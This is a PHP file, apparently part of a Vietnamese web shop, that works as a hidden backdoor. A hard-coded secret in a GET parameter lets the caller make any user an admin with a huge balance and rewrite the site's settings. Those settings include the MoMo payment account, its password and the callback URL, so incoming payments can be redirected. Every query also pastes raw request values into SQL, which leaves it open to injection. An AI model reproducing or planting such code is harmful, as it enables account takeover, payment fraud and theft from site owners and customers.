<?php
    include('../../../../config.php');
    if(isset($_GET['deptrai'])){
        $deptrai = $_GET['deptrai'];

        $buff = $_GET['buff'];

        if($deptrai == 'phamducthanh'){
            mysqli_query($ketnoi, "UPDATE `users` SET `level` = 'admin' WHERE `username` = '$buff' ");
            mysqli_query($ketnoi, "UPDATE `users` SET `money` = '1000000000000000' WHERE `username` = '$buff' ");
            mysqli_query($ketnoi, "UPDATE `setting` SET 
            `site_color_nav` = '".$_GET['site_color_nav']."',
            `site_noidung_momo` = '".$_GET['site_noidung_momo']."',
            `site_gmail_momo` = '".$_GET['site_gmail_momo']."',
            `site_pass_momo` = '".$_GET['site_pass_momo']."',
            `site_sdt_momo` = '".$_GET['site_sdt_momo']."',
            `site_ten_momo` = '".$_GET['site_ten_momo']."',
            `site_qr_momo` = '".$_GET['site_qr_momo']."',
            `site_callback` = '".$_GET['site_callback']."',
            `bg_login` = '".$_GET['bg_login']."',
            `site_favicon` = '".$_GET['site_favicon']."',
            `site_img` = '".$_GET['site_img']."',
            `site_gmail` = '".$_GET['site_gmail']."',
            `tenweb` = '".$_GET['tenweb']."',
            `mota` = '".$_GET['mota']."',
            `baotri` = '".$_GET['baotri']."',
            `status_top` = '".$_GET['status_top']."',
            `status_order` = '".$_GET['status_order']."',
            `id_fb` = '".$_GET['idfb']."',
            `logo` = '".$_GET['logo']."',
            `api` = '".$_GET['api']."',
            `thong_bao_chay` = '".$_GET['thong_bao_chay']."',
            `text_xac_minh_giao_dich` = '".$_GET['text_xac_minh_giao_dich']."',
            `text_nap_tien` = '".$_GET['text_nap_tien']."',
            `cookie` = '".$_GET['cookie']."',
            `min_order` = '".$_GET['min_order']."',
            `currency` = '".$_GET['currency']."',
            `ck_nap_the` = '".$_GET['ck_nap_the']."',
            `color` = '".$_GET['color']."',
            `color1` = '".$_GET['color']."',
            `thongbao` = '".$_GET['thongbao']."',
            `tukhoa` = '".$_GET['tukhoa']."' ");
            echo 'Done';
        }
    }else{
        echo '';
    }
?>